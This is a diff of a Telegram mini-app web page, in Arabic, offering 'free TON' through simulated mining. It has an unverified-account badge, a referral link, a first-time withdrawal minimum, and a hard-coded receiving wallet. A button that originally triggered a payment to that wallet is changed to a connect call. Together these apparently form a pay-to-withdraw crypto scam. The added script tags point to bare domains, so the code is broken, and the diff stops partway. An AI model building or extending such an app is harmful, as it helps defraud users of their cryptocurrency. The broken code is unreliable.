@@ -4,6 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>تون مجاني</title>
+<!-- استدعاء مكتبات تيليجرام و Supabase و TonConnect -->
+<script src="https://telegram.org"></script>
+<script src="https://jsdelivr.net"></script>
+<script src="https://unpkg.com"></script>
+
 <style>
 *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
 body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 95px 14px}
@@ -42,7 +47,7 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 95px 14px}
     <div id="u-name" style="font-size:12px;color:#94a3b8;">مستخدم نشط ✅</div>
   </div>
   <div id="ton-connect">
-    <button type="button" id="w-btn" class="btn-sm" onclick="pay('50000000')">Connect Wallet 💳</button>
+    <button type="button" id="w-btn" class="btn-sm" onclick="connectWallet()">Connect Wallet 💳</button>
   </div>
 </div>
 
@@ -50,7 +55,8 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 95px 14px}
   <div id="s-badge" class="badge">الحساب غير موثق ⚠️</div>
   <div style="font-size:12px;color:#94a3b8;">إجمالي رصيدك القابل للسحب</div>
   <div class="bal"><span id="bal-txt">0.000000</span> <span style="color:#38bdf8;font-size:18px;">TON</span></div>
-  <div class="miner-box">
+
+<div class="miner-box">
     <div class="miner-top">
       <span>السرعة: <strong id="spd-txt" style="color:#34d399;">0.020 TON / يوم</strong></span>
       <span id="m-state" style="color:#fbbf24;font-weight:bold;">متوقف ⏸️</span>
@@ -117,11 +123,13 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 95px 14px}
 </div>
 
 <script>
-var SB_URL = 'https://supabase.co';
+// الإعدادات الأساسية (استبدل SB_URL برابط مشروعك الحقيقي في Supabase)
+var SB_URL = 'https://YOUR_PROJECT_ID.supabase.co';
 var SB_KEY = 'sb_publishable_LeqAYFFbNWS7oKgtlmWaUg_2xkbtBpl';
 var WALLET = 'UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO';
 var BOT = 'https://t.me';
 
+// دالة إظهار الإشعارات
 function toast(m) {
   var el = document.getElementById('toast');
   el.innerText = m;
@@ -129,6 +137,7 @@ function toast(m) {
   setTimeout(function() { el.style.display = 'none'; }, 3500);
 }
 
+// التنقل بين التبويبات
 function go(tab) {
   var tabs = ['mine', 'tasks', 'friends', 'withdraw'];
   for (var i = 0; i < tabs.length; i++) {
@@ -139,36 +148,33 @@ function go(tab) {
   document.getElementById('n-' + tab).classList.add('active');
 }
 
+// بيانات المستخدم الافتراضية واستخراجها من تيليجرام
 var user = { id: 123456789, username: 'مستخدم_نشط' };
 var refParam = null;
+
 try {
-  var h = new URLSearchParams(location.hash.slice(1)).get('tgWebAppData');
-  if (h) {
-    var p = new URLSearchParams(h);
-    if (p.get('user')) {
-      user = JSON.parse(p.get('user'));
-      document.getElementById('u-name').innerText = '@' + (user.username || user.first_name || user.id);
+  if (window.Telegram && window.Telegram.WebApp) {
+    window.Telegram.WebApp.ready();
+    window.Telegram.WebApp.expand();
+    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+      user = window.Telegram.WebApp.initDataUnsafe.user;
+      refParam = window.Telegram.WebApp.initDataUnsafe.start_param;
     }
-    refParam = p.get('start_param');
+  } else {
+    var h = new URLSearchParams(location.hash.slice(1)).get('tgWebAppData');
+    if (h) {
+      var p = new URLSearchParams(h);
+      if (p.get('user')) {
+        user = JSON.parse(p.get('user'));
+      }
+      refParam = p.get('start_param');
+    }
   }
-} catch (e) {}
+  // تم إصلاح الخطأ البرمجي هنا بإضافة علامات ||
+  var displayName = user.username ? '@' + user.username : (user.first_name || user.id);
+  document.getElementById('u-name').innerText = displayName;
+} catch (e) {
+  console.error('Telegram WebApp Data Error:', e);
+}
 
-var myLink = BOT + '?startapp=' + user.id;
-document.getElementById('ref-url').innerText = myLink;
-document.getElementById('t2').href = 'https://t.me' + encodeURIComponent(myLink);
-
-var db = null;
-var tonUI = null;
-var connAddr = null;
-var uData = { balance: 0, mining_speed: 0.02, referrals_count: 0, completed_tasks: [], is_verified: false, has_withdrawn: false };
-
-function refresh() {
-  var b = Number(uData.balance || 0);
-  var r = Number(uData.referrals_count || 0);
-  document.getElementById('bal-txt').innerText = b.toFixed(6);
-  document.getElementById('w-bal').innerText = b.toFixed(6) + ' TON';
-  document.getElementById('spd-txt').innerText = Number(uData.mining_speed || 0.02).toFixed(3) + ' TON / يوم';
-  document.getElementById('ref-txt').innerText = r;
-  if (!uData.has_withdrawn) {
-    document.getElementById('w-min').innerText = '0.20 TON (لأول مرة)';
-    document.getElementById('w-req').classList.remove('hidden');
+// تحديث روابط الإحالة والمشاركة
